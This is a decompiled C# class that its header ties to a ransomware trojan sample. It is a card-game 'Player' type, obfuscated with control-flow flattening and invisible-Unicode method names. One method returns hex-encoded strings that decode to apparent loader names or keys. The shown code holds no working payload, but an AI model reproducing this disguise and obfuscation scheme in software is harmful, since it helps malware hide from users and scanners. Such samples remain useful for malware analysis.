// Decompiled with JetBrains decompiler
// Type: Cytotechnologist.Player
// Assembly: InternalSi, Version=2.0.4.0, Culture=neutral, PublicKeyToken=null
// MVID: F44F14A9-876B-4F73-A898-F3E4E8A5FAFC
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.02-msil\HEUR-Trojan-Ransom.MSIL.Blocker.gen-054cde86997158b8d0515e30ca53b657ef96d212987a89f7eb3b76e7fe727d62.exe

using SimpleJSON;
using System.Runtime.InteropServices;

namespace Cytotechnologist
{
  public class Player
  {
    public static string MembershipCondition(int BaseStream)
    {
      string str1 = (string) null;
      if (BaseStream != 0)
        goto label_4;
label_1:
      int num1 = -1511437914;
label_2:
      bool flag;
      string str2;
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) (num1 ^ -1547222756)) % 12U)
        {
          case 0:
            num1 = (int) num2 * -1848206679 ^ -6730425;
            continue;
          case 1:
            num1 = (int) num2 * 1437244529 ^ 2079000605;
            continue;
          case 2:
            goto label_1;
          case 4:
            num1 = (int) num2 * 1803396721 ^ -2055655777;
            continue;
          case 5:
            goto label_4;
          case 6:
            num1 = (int) num2 * 2120961376 ^ -2074330810;
            continue;
          case 7:
            num1 = (int) num2 * 1109545879 ^ 1851581933;
            continue;
          case 8:
            str1 = "336F55636B736D4867";
            num1 = (int) num2 * -683893032 ^ 1121147763;
            continue;
          case 9:
            int num3 = flag ? 1640431006 : (num3 = 166926954);
            num1 = num3 ^ (int) num2 * -1979102207;
            continue;
          case 10:
            str1 = "53746F7265417373656D626C79456E756D6572617469";
            num1 = (int) num2 * -645093881 ^ -1270399369;
            continue;
          case 11:
            str2 = str1;
            num1 = -1378297560;
            continue;
          default:
            goto label_13;
        }
      }
label_13:
      return str2;
label_4:
      flag = BaseStream == 1;
      num1 = -1848717659;
      goto label_2;
    }

    public string Name { get; private set; }

    private int[] PlanningCards { get; set; }

    public bool UseOneMorePlanningSprint { get; private set; }

    public int PlannedForCard(int cardTypeIndex)
    {
label_1:
      int num1 = -555114242;
      int num2;
      while (true)
      {
        uint num3;
        int num4;
        switch ((num3 = (uint) (num1 ^ -1205934989)) % 4U)
        {
          case 1:
            if (this.PlanningCards.Length == 0)
            {
              num1 = (int) num3 * 252858689 ^ -1571736988;
              continue;
            }
            num4 = this.PlanningCards[cardTypeIndex];
            break;
          case 2:
            num4 = 0;
            break;
          case 3:
            goto label_1;
          default:
            goto label_8;
        }
        num2 = num4;
        num1 = -1405680321;
      }
label_8:
      return num2;
    }

    public int PlanningCardsCount
    {
      get
      {
label_1:
        int num1 = 847921864;
        int num2;
        int[] planningCards;
        int num3;
        bool flag;
        int planningCardsCount;
        int index;
        while (true)
        {
          uint num4;
          switch ((num4 = (uint) (num1 ^ 1853057946)) % 13U)
          {
            case 0:
              num1 = (int) num4 * -1920667028 ^ 1148793972;
              continue;
            case 1:
              num3 = planningCards[index];
              num1 = 1430852118;
              continue;
            case 2:
              goto label_1;
            case 3:
              num2 = 0;
              num1 = (int) num4 * 2058907517 ^ 1674897173;
              continue;
            case 4:
              int num5;
              num1 = num5 = index >= planningCards.Length ? 1716957056 : (num5 = 1377754346);
              continue;
            case 5:
              ++index;
              num1 = 1595286018;
              continue;
            case 6:
              flag = num3 > 0;
              num1 = (int) num4 * -1838227277 ^ -1033471145;
              continue;
            case 7:
              int num6 = flag ? -883544266 : (num6 = -123446750);
              num1 = num6 ^ (int) num4 * -1015913167;
              continue;
            case 8:
              ++num2;
              num1 = (int) num4 * 1496414196 ^ 1203148927;
              continue;
            case 9:
              index = 0;
              num1 = (int) num4 * -31707339 ^ 1850721413;
              continue;
            case 11:
              planningCardsCount = num2;
              num1 = (int) num4 * -1129522802 ^ 864569126;
              continue;
            case 12:
              planningCards = this.PlanningCards;
              num1 = (int) num4 * 198953833 ^ -493134500;
              continue;
            default:
              goto label_14;
          }
        }
label_14:
        return planningCardsCount;
      }
    }

    private Player()
    {
label_1:
      int num1 = 913849452;
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) (num1 ^ 146326727)) % 3U)
        {
          case 0:
            goto label_1;
          case 1:
            num1 = (int) num2 * 620334698 ^ -1505252543;
            continue;
          case 2:
            goto label_3;
          default:
            goto label_5;
        }
      }
label_3:
      return;
label_5:;
    }

    public string PlanningCardsToString()
    {
      string str1 = " ";
      int index = 0;
label_4:
      bool flag1 = index < this.PlanningCards.Length;
      int num1 = -277541946;
      int planningCard;
      bool flag2;
      string str2;
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) (num1 ^ -1717586510)) % 12U)
        {
          case 0:
            num1 = (int) num2 * -1033438180 ^ -161441653;
            continue;
          case 1:
            planningCard = this.PlanningCards[index];
            num1 = -1714908720;
            continue;
          case 2:
            flag2 = planningCard == 0;
            num1 = (int) num2 * -1137808026 ^ 38251709;
            continue;
          case 3:
            str1 = Player.\u206C⁬‭‮‏⁭‪⁫⁭‍‌‬‍‪⁯‪‪‌‫‪‎​‭​⁪⁪‏⁪‏‪⁯‌​⁬‏‪‮‎‌‬‮(new string[5]
            {
              str1,
              Card.CardTypeNames[index],
              "x",
              planningCard.ToString(),
              " "
            });
            num1 = -1614097947;
            continue;
          case 4:
            int num3 = flag1 ? 648055823 : (num3 = 1449488228);
            num1 = num3 ^ (int) num2 * -1279426234;
            continue;
          case 5:
            num1 = (int) num2 * 625593784 ^ -1872165923;
            continue;
          case 6:
            goto label_4;
          case 7:
            int num4 = !flag2 ? -1752306838 : (num4 = -949699628);
            num1 = num4 ^ (int) num2 * 1293711837;
            continue;
          case 8:
            num1 = -1553200201;
            continue;
          case 10:
            str2 = str1;
            num1 = (int) num2 * 388869291 ^ -118458228;
            continue;
          case 11:
            ++index;
            num1 = -508192528;
            continue;
          default:
            goto label_13;
        }
      }
label_13:
      return str2;
    }

    public static Player Deserialize(JSONNode json) => new Player()
    {
      Name = json["name"].Value,
      PlanningCards = Player.ParsePlanningCards(json["planning-cards"]),
      UseOneMorePlanningSprint = json["use-one-more-planning-sprint"].AsBool
    };

    private static int[] ParsePlanningCards(JSONNode json)
    {
label_1:
      int num1 = -957319874;
      int count;
      int aIndex;
      int[] numArray;
      int[] planningCards;
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) (num1 ^ -1535163925)) % 11U)
        {
          case 0:
            numArray[aIndex] = json[aIndex].AsInt;
            num1 = -567380021;
            continue;
          case 1:
            count = json.Count;
            num1 = (int) num2 * 206535693 ^ 1983840041;
            continue;
          case 2:
            aIndex = 0;
            num1 = (int) num2 * 519618297 ^ -178225573;
            continue;
          case 3:
            num1 = (int) num2 * -815381730 ^ 1429561819;
            continue;
          case 4:
            ++aIndex;
            num1 = (int) num2 * 774859272 ^ -818744657;
            continue;
          case 5:
            int num3;
            num1 = num3 = aIndex < count ? -17509065 : (num3 = -455302038);
            continue;
          case 6:
            numArray = new int[count];
            num1 = (int) num2 * -1213438029 ^ 2120726116;
            continue;
          case 7:
            planningCards = numArray;
            num1 = (int) num2 * 1684359794 ^ -2048866680;
            continue;
          case 8:
            goto label_1;
          case 9:
            num1 = (int) num2 * -823951206 ^ -623079628;
            continue;
          default:
            goto label_12;
        }
      }
label_12:
      return planningCards;
    }

    public override string ToString()
    {
label_1:
      int num1 = 275427886;
      string str;
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) (num1 ^ 1097024123)) % 3U)
        {
          case 0:
            goto label_1;
          case 1:
            str = Player.\u200F​‮‪⁪⁬‎⁯⁯‎‎⁮‎‌⁫​⁯‌⁯‪‎‭⁭‪‍⁭⁬​⁬⁪‍‌‬‭⁬‌‫‬‬‫‮("name: {0},\nplanning-cards: [{1}]\nuse-one-more-planning-sprint: {2}", (object) this.Name, (object) this.PlanningCardsToString(), (object) this.UseOneMorePlanningSprint);
            num1 = (int) num2 * 786346086 ^ -635276801;
            continue;
          default:
            goto label_4;
        }
      }
label_4:
      return str;
    }

    static string \u206C⁬‭‮‏⁭‪⁫⁭‍‌‬‍‪⁯‪‪‌‫‪‎​‭​⁪⁪‏⁪‏‪⁯‌​⁬‏‪‮‎‌‬‮([In] string[] obj0) => string.Concat(obj0);

    static string \u200F​‮‪⁪⁬‎⁯⁯‎‎⁮‎‌⁫​⁯‌⁯‪‎‭⁭‪‍⁭⁬​⁬⁪‍‌‬‭⁬‌‫‬‬‫‮(
      [In] string obj0,
      [In] object obj1,
      [In] object obj2,
      [In] object obj3)
    {
      return string.Format(obj0, obj1, obj2, obj3);
    }
  }
}
